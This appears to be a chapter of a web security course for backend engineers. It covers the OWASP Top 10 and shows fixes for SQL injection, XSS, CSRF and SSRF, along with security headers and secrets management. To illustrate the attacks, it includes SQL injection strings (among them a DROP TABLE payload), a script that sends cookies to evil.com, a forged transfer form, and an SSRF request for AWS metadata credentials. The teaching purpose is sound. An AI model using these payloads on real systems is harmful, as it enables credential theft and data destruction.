## OWASP Top 10 (8.22)

The OWASP (Open Web Application Security Project) Top 10 is the most widely referenced list of critical web security risks. Every backend engineer must know these.

```
OWASP TOP 10 (2021):

A01 Broken Access Control
  Failing to enforce authorization.
  Example: GET /users/123 works even for user 456 (no ownership check)
  Fix: Always verify the authenticated user owns/can access the requested resource.

A02 Cryptographic Failures
  Using weak crypto, storing plaintext passwords, unencrypted PII.
  Fix: bcrypt/Argon2 for passwords, AES-256 for data at rest, TLS 1.3 in transit.

A03 Injection (SQL, OS, LDAP, NoSQL)
  Untrusted data sent to an interpreter as part of a command.
  Fix: parameterized queries, ORMs, input validation, principle of least privilege.

A04 Insecure Design
  Missing threat modeling, security principles not built in.
  Fix: Security requirements in design phase, threat modeling.

A05 Security Misconfiguration
  Default credentials, open S3 buckets, verbose error messages, unnecessary features.
  Fix: Secure defaults, disable unused features, audit configs.

A06 Vulnerable and Outdated Components
  Using libraries with known CVEs.
  Fix: Dependabot, snyk, regular dependency updates.

A07 Identification and Authentication Failures
  Weak passwords, missing MFA, credential stuffing not prevented.
  Fix: Strong password policies, MFA, account lockout, CAPTCHA.

A08 Software and Data Integrity Failures
  Unsigned updates, insecure deserialization, CI/CD pipeline compromise.
  Fix: Verify software integrity, secure CI/CD, safe deserialization.

A09 Security Logging and Monitoring Failures
  Not detecting attacks, incomplete audit trails.
  Fix: Log auth events, monitor for suspicious patterns, alert.

A10 Server-Side Request Forgery (SSRF)
  Server makes HTTP request to attacker-controlled URL.
  Fix: Whitelist allowed URLs/IPs, block internal network access from user-supplied URLs.
```

## SQL Injection (8.23): The Classic Attack

```python
# VULNERABLE: string interpolation in SQL
user_input = "' OR '1'='1"
query = f"SELECT * FROM users WHERE email = '{user_input}'"
# Becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
# Returns ALL users — authentication bypass!

# More dangerous:
user_input = "alice@example.com'; DROP TABLE users; --"
# Destroys the users table

# FIX 1: Parameterized queries (always)
# asyncpg:
row = await conn.fetchrow(
    "SELECT * FROM users WHERE email = $1",
    user_input  # safely escaped by the driver
)

# SQLAlchemy:
result = await session.execute(
    select(User).where(User.email == user_input)  # ORM handles escaping
)

# psycopg2:
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))

# FIX 2: Principle of least privilege
# DB user for your app should only have SELECT/INSERT/UPDATE/DELETE
# Never CONNECT as superuser in your application
# Never allow DROP, CREATE, ALTER from application code

# TESTING: use sqlmap or manual testing with payloads like:
# ' OR '1'='1
# '; WAITFOR DELAY '0:0:5'--
# 1; SELECT * FROM information_schema.tables
```

## XSS — Cross-Site Scripting (8.24)

```python
# VULNERABLE: rendering user content without escaping
# (Backend stores, frontend renders — but backend must sanitize input)

# Stored XSS: attacker stores malicious script in database
# Other users load the page → script executes in their browser
user_comment = "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
# If stored and rendered: steals cookies of everyone who views the comment

# FIX 1: Backend sanitization before storage
import bleach

ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'p', 'br']
ALLOWED_ATTRS = {'a': ['href', 'title']}

def sanitize_html(content: str) -> str:
    return bleach.clean(content, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS)

# FIX 2: Content Security Policy header
# Prevents browser from executing inline scripts
response.headers["Content-Security-Policy"] = (
    "default-src 'self'; "
    "script-src 'self' https://cdn.trusted.com; "
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data: https:; "
    "object-src 'none'"
)

# FIX 3: X-Content-Type-Options (prevents MIME sniffing)
response.headers["X-Content-Type-Options"] = "nosniff"

# FIX 4: HTTPOnly cookies (JS can't read session cookie even if XSS occurs)
response.set_cookie("session", value, httponly=True)
```

## CSRF — Cross-Site Request Forgery (8.25)

```python
# CSRF: evil.com tricks user's browser into making authenticated request to yoursite.com
# User is logged into bank.com. Visits evil.com.
# evil.com has: <form action="https://bank.com/transfer" method="POST">
#               <input name="to" value="attacker">
#               <input name="amount" value="10000">
#               (auto-submits via JavaScript)
# Browser sends the form WITH the bank.com session cookie!

# FIX 1: SameSite cookies (modern, primary defense)
response.set_cookie("session", value, samesite="lax")
# Browser won't send cookie on cross-site POST requests

# FIX 2: CSRF tokens (legacy defense, still needed for SameSite=None)
import secrets
from fastapi import Form

@app.get("/transfer-form")
async def get_form(request: Request):
    csrf_token = secrets.token_urlsafe(32)
    await redis.setex(f"csrf:{csrf_token}", 3600, "valid")
    # Include csrf_token in the form HTML
    return templates.TemplateResponse("transfer.html", {"csrf_token": csrf_token})

@app.post("/transfer")
async def transfer(csrf_token: str = Form(), amount: int = Form()):
    if not await redis.get(f"csrf:{csrf_token}"):
        raise HTTPException(403, "Invalid CSRF token")
    await redis.delete(f"csrf:{csrf_token}")  # single use
    # Process transfer...

# FIX 3: Verify Origin/Referer header
@app.middleware("http")
async def csrf_check(request: Request, call_next):
    if request.method in ["POST", "PUT", "PATCH", "DELETE"]:
        origin = request.headers.get("origin")
        referer = request.headers.get("referer")
        if origin and not origin.startswith("https://yoursite.com"):
            return JSONResponse(status_code=403, content={"error": "CSRF detected"})
    return await call_next(request)
```

## SSRF — Server-Side Request Forgery (8.26)

```python
# SSRF: attacker tricks your server into making requests to internal resources
# Your server has access to: 169.254.169.254 (AWS metadata), internal services

# VULNERABLE:
@app.post("/fetch-url")
async def fetch_url(url: str):
    async with httpx.AsyncClient() as client:
        response = await client.get(url)  # user controls this!
    return response.text
# Attacker sends url="http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# → Retrieves AWS IAM credentials!

# FIX 1: Whitelist allowed domains
ALLOWED_DOMAINS = {"api.trusted.com", "data.partner.com"}

async def safe_fetch(url: str) -> str:
    from urllib.parse import urlparse
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP/HTTPS allowed")
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain not allowed: {parsed.hostname}")
    # Also: resolve hostname and check it's not a private IP
    import socket
    ip = socket.gethostbyname(parsed.hostname)
    if is_private_ip(ip):
        raise ValueError(f"Private IP not allowed: {ip}")
    async with httpx.AsyncClient() as client:
        return await client.get(url)

def is_private_ip(ip: str) -> bool:
    import ipaddress
    addr = ipaddress.ip_address(ip)
    return (addr.is_private or addr.is_loopback or
            addr.is_link_local or addr.is_reserved)
```

## Security Headers (8.30): The Complete Set

```python
# FastAPI middleware to add all security headers
from starlette.middleware.base import BaseHTTPMiddleware

SECURITY_HEADERS = {
    # Prevent MIME type sniffing
    "X-Content-Type-Options": "nosniff",
    # Prevent clickjacking (prefer CSP frame-ancestors)
    "X-Frame-Options": "DENY",
    # XSS protection (legacy, modern browsers use CSP)
    "X-XSS-Protection": "1; mode=block",
    # Force HTTPS for 1 year
    "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
    # Limit information in Referer header
    "Referrer-Policy": "strict-origin-when-cross-origin",
    # Disable dangerous browser features
    "Permissions-Policy": "geolocation=(), microphone=(), camera=(), payment=()",
    # Content Security Policy (customize per app)
    "Content-Security-Policy": (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data: https:; "
        "connect-src 'self'; "
        "font-src 'self'; "
        "object-src 'none'; "
        "frame-ancestors 'none';"
    ),
}

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request, call_next):
        response = await call_next(request)
        for key, value in SECURITY_HEADERS.items():
            response.headers[key] = value
        return response

# Test your headers: https://securityheaders.com/
```

## Secrets Management (8.33)

See also: [2.5 — Secrets management](../phase-02-core-backend-concepts/2.05-secrets-management.md)

```python
# Production pattern: load secrets from AWS Secrets Manager at startup
import boto3
import json
from functools import lru_cache

@lru_cache(maxsize=None)
def get_secret(name: str) -> dict:
    client = boto3.client("secretsmanager", region_name="us-east-1")
    response = client.get_secret_value(SecretId=name)
    return json.loads(response["SecretString"])

# Database URL constructed from secrets, not hardcoded
db_creds = get_secret("prod/myapp/database")
DATABASE_URL = f"postgresql://{db_creds['username']}:{db_creds['password']}@{db_creds['host']}/{db_creds['dbname']}"

# Secrets rotation: AWS Secrets Manager can rotate DB passwords automatically
# Application calls get_secret() on connection failure to get new credentials
```

## The Security Checklist

```
EVERY PRODUCTION BACKEND MUST HAVE:

AUTHENTICATION:
□ Passwords hashed with bcrypt/Argon2 (never MD5/SHA256)
□ JWT expiry ≤ 15 minutes
□ Refresh tokens stored securely (Redis), rotated on use
□ MFA available for sensitive accounts
□ Account lockout after N failed logins

AUTHORIZATION:
□ Every endpoint checks: is this user authorized? (not just authenticated)
□ Resource ownership verified (user can't access other users' data)
□ Admin-only endpoints explicitly protected

INJECTION:
□ All database queries use parameterized queries
□ No raw SQL string formatting with user input
□ User input sanitized before storage (HTML content)

TRANSPORT:
□ HTTPS only (HTTP redirects to HTTPS)
□ HSTS header set
□ TLS 1.2 minimum, 1.3 preferred

HEADERS:
□ X-Content-Type-Options: nosniff
□ X-Frame-Options: DENY
□ Content-Security-Policy configured
□ Referrer-Policy set

DATA:
□ No sensitive data in logs (passwords, tokens, credit cards)
□ Secrets in secret manager (not .env files)
□ PII handled per GDPR/CCPA requirements

MONITORING:
□ Auth events logged (login success/failure, role changes)
□ Alert on unusual patterns (too many 401s, IPs)
□ Dependencies scanned weekly for CVEs
```
